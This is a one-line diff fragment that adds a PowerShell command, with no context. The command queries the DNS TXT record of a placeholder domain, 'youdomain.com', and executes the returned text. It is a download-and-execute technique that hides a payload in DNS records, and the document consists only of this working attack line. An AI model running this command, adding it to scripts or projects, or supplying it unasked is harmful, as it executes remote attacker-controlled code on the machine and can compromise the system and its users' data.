@@ -1,0 +1,1 @@
+powershell .(nslookup -q=txt youdomain.com)[-1]
